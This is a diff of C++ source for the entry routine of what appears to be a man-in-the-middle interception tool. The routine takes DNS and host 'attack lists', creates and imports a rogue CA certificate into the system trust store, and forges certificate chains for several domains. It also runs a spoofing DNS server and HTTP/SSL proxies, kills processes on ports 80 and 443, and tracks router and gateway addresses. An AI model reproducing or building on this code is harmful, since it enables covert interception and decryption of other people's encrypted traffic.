@@ -24,11 +24,11 @@
 #include "MakeCert.h"
 
 #include "../FileOper.h"
-#include "InformerProc.h"
-#include "InformerClient.h"
+#include "informerServer.h"
+#include "InformerInterface.h"
 #include "../attacker.h"
 #include "SSLRetransfer.h"
-#include "../DnsUtils/DnsKeeper.h"
+#include "../DnsUtils/DnsServer.h"
 
 #include "HttpProxy.h"
 #include "SSLProxy.h"
@@ -41,8 +41,18 @@
 
 using namespace std;
 
-unsigned char	gLocalIPAddrV6[16] = { 0 };
-DWORD			gLocalIPAddr = 0;
+unsigned char	gLocalMac[MAC_ADDRESS_SIZE];
+
+unsigned char	gRouterMac[MAC_ADDRESS_SIZE];
+
+DWORD			gNetmask;
+
+DWORD			gRouterIP = 0;
+
+DWORD			gDnsServer = 0;
+
+unsigned char	gLocalIPV6[16] = { 0 };
+DWORD			gLocalIP = 0;
 string			gstrLocalIP = "";
 
 DWORD			gServerIP = 0;
@@ -50,6 +60,8 @@ string			gstrServerIP = "";
 
 string			gLocalPath = "";
 string			gOpensslPath = "";
+string			gOpensslWinPath = "";
+string			gOpensslRoot = "";
 
 //msvcr120.dll
 //libcrypto-1.1.dll
@@ -57,79 +69,57 @@ string			gOpensslPath = "";
 int __cdecl SSLEntry::sslEntry(unsigned long serverIP,unsigned long localIP,string path,int control,
 	vector<string>gDnsAttackList, vector<string>gHostAttackList,int mode)
 {
-
-	int	nRetCode = 0;
+	int	ret = 0;
 
 	//system("regsvr32 msvcr120.dll");
 
-	gOpensslPath = OpenSSLConfig::getOpenSSLPath();
-	if (gOpensslPath == "")
-	{
-		nRetCode = OpenSSLConfig::getOpenSSLPathFromCfg();
-		if (gOpensslPath == "")
-		{
-			MessageBoxA(0, "need setup openssl", "need setup openssl", MB_OK);
-			ExitProcess(0);
-		}
-	}
-
-	if (gOpensslPath.back() == '\\')
-	{
-		gOpensslPath = gOpensslPath + "bin\\";
-	}
-	else {
-		gOpensslPath = gOpensslPath + "\\bin\\";
-	}
-	
-	string winOpensslPath = gOpensslPath;
-	gOpensslPath = Public::winPath2Linux(winOpensslPath.c_str());
-
-	nRetCode = OpenSSLConfig::addSystemPath(winOpensslPath);
-
-	printf("set openssl path:%s\r\n", gOpensslPath.c_str());
-
-	nRetCode = OpenSSLConfig::initOpensslPath(control);
+	ret = OpenSSLConfig::InitOpenssl(control);
 	
 	//MakeSureDirectoryPathExists must end with "\\"
 	string outputpath = gLocalPath + OUTPUT_PATH + "\\";
-	nRetCode = MakeSureDirectoryPathExists(outputpath.c_str());
+	ret = MakeSureDirectoryPathExists(outputpath.c_str());
 
 	string certpath = gLocalPath + CERT_PATH + "\\";
-	nRetCode = MakeSureDirectoryPathExists(certpath.c_str());
+	ret = MakeSureDirectoryPathExists(certpath.c_str());
 
 	string cacertpath = gLocalPath + CA_CERT_PATH + "\\";
-	nRetCode = MakeSureDirectoryPathExists(cacertpath.c_str());
+	ret = MakeSureDirectoryPathExists(cacertpath.c_str());
 
 	string pluginpath = gLocalPath + "plugin\\";
-	nRetCode = MakeSureDirectoryPathExists(pluginpath.c_str());
+	ret = MakeSureDirectoryPathExists(pluginpath.c_str());
 
-	nRetCode = SSLPublic::prepareCertChain("debugqq.com");
-	nRetCode = SSLPublic::prepareCertChain("assistsqq.com");
-	nRetCode = SSLPublic::prepareCertChain("lovemeqq.com");
+	ret = MakeCert::checkCAExist();
 
-	nRetCode = MakeCert::checkCAExist();
+	ret = SSLPublic::prepareCertChain("debugqq.com");
+	ret = SSLPublic::prepareCertChain("assistsqq.com");
+	ret = SSLPublic::prepareCertChain("lovemeqq.com");
 
-	nRetCode = ImportCert::ImportCACertification();
+	MakeCert::initCertMutex();
 
-	InformerProc *informerProc = new InformerProc();
+	ret = ImportCert::ImportCACertification();
+
+	InformerServer *informerSvc = new InformerServer();
 
 	Deamon * deamon = new Deamon();
 
-	DnsProxy *dnsproxy = new DnsProxy(serverIP);
+	//DnsProxy *dnsproxy = new DnsProxy(serverIP);
+	//DnsProxyIPV6 *dnsproxyipv6 = new DnsProxyIPV6(serverIP);
 
-	DnsProxyIPV6 *dnsproxyipv6 = new DnsProxyIPV6(serverIP);
-
-	DnsKeeper *dnskeeper = new DnsKeeper();
+	DnsServer*dnssvr = new DnsServer();
 	
 	SSLPublic *sslpublic = new SSLPublic(gHostAttackList);
 
-	OtherListener * other8888 = new OtherListener(1864);//HCDNClientUpdate.ini
-	OtherListener * other1864 = new OtherListener(8888);//tencetvideo pc
-	OtherListener * other9090 = new OtherListener(9090);//letv
+	//OtherListener * other8888 = new OtherListener(1864);//HCDNClientUpdate.ini
+	//OtherListener * other1864 = new OtherListener(8888);//tencetvideo pc
+	//OtherListener * other9090 = new OtherListener(9090);//letv
+
+	KillProcessPort(80);
+
+	KillProcessPort(443);
 
 	HttpProxyListener *httplistener = new HttpProxyListener();
 
-	SslProxyListener *ssllistener = new SslProxyListener();
+	SSLProxyListener *ssllistener = new SSLProxyListener();
 
-	return nRetCode;
+	return ret;
 }
